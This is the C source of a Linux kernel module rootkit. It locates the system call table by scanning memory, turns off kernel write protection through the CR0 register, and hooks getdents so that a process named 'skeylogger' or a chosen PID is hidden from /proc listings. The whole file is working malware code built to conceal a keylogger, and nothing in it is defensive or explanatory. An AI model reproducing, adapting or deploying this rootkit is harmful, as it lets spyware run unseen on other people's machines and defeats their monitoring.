#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <asm/uaccess.h>
#include <linux/list.h>
#include <linux/types.h>
#include <linux/sched.h>
#include <linux/stat.h>
#include <linux/proc_fs.h>  

MODULE_LICENSE("GPL");

#define RANGE_START 0xc0000000
#define RANGE_END 	0xd0000000

typedef unsigned int ptr_size;

ptr_size *sys_call_table;
char process_name[12]="skeylogger";
int process_PID = 2810;
bool use_PID = false;

struct linux_dirent{
    unsigned long     d_ino;
    unsigned long     d_off;
    unsigned short    d_reclen;
    char    d_name[1];
};


asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);

/* Convert string to integer */
int atoi(char *str)  
{  
    int res = 0;  
    int mul = 1;  
    char *ptr;  
    for(ptr = str + strlen(str)-1; ptr >= str; ptr--){  
        if(*ptr < '0' || *ptr > '9')  
            return -1;  
        res += (*ptr -'0') * mul;  
        mul *= 10;  
    }  
    return res;  
}  

asmlinkage long hacked_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count) {
	
	long value = 0;
	int total_length = 0;
	int pid = 0;
	struct  task_struct *task = NULL;
	bool found = false;

	struct kstat fbuf;
	vfs_fstat(fd, &fbuf); 

	if (orig_getdents == NULL) {
		printk("Oooooooops: orig_getdents is NULL here!\n");
		return 0;
	}

	if (dirp == NULL) {
		printk("Oooooooops: dirp is NULL here\n");
		return 0;
	}

	value = (*orig_getdents) (fd, dirp,count);
	total_length = value;

	/*if the directory is not /proc we do nothing*/
	if (!(fbuf.ino == PROC_ROOT_INO && !MAJOR(fbuf.dev) && MINOR(fbuf.dev) == 3))
		return value;

	while (total_length > 0) {
		int cur_length = dirp -> d_reclen;
		total_length -= cur_length;

		pid = atoi(dirp -> d_name);

		if (use_PID) {
			printk("total_length = %d, pid = %d, process_PID = %d\n", total_length, pid, process_PID);
			if (pid == process_PID) {
				found = true;
				printk("found pid = %d\n", pid);
			}
		}
		else {
				task = pid_task(find_vpid(pid), PIDTYPE_PID);
				if (task != NULL && pid != -1) {
					//printk("found task->comm = %s\n", task -> comm);
					if (strstr(task -> comm, process_name))
						found = true;
				}
		}
		if (found) {
			printk("Process found!\n");
			memmove(dirp, (char *) dirp + cur_length, total_length);
			value -= cur_length;
			printk("Process hidden!\n");
		}
		if (total_length && !found) {
			dirp = (struct linux_dirent *) ((char *)dirp + cur_length);
		}
		/*Below are meant to support the feature that hiding several processes with the same specific name*/
		if (found)
			found = false;
	}
	printk("hacked_getdents finished\n");
	return value;
}

ptr_size *search_sct(void) {
	ptr_size i = RANGE_START;
	ptr_size *table;
	while (i < RANGE_END) {
		table = (ptr_size *) i;
		if (table[__NR_close] == sys_close)
			return (ptr_size *) i;
		i += 4;
	}
	printk("Oooooooops : Did not match sys_close!");
	return NULL;
}

static int hider_init(void) {
	/*search for the sys_call_table*/
	sys_call_table = search_sct();

	if (sys_call_table)
		printk("sys_call_table found at %p\n", sys_call_table);
	else 
		printk("Oooooooops: sys_call_table not found!\n");
	
	/*modify the control register cr0*/
	write_cr0(read_cr0() & (~ 0x10000));

	orig_getdents = sys_call_table[__NR_getdents];
	
	/*do something evil*/
	sys_call_table[__NR_getdents] = hacked_getdents;

	/*change back the control register*/
	write_cr0(read_cr0() | (0x10000));

	printk("module loaded.\n");
	return 0;
}

static void hider_exit(void) {
	write_cr0(read_cr0() & (~ 0x10000));
	sys_call_table[__NR_getdents] = orig_getdents;
	write_cr0(read_cr0() | (0x10000));
	printk("module removed.\n");
}


module_init(hider_init);
module_exit(hider_exit);
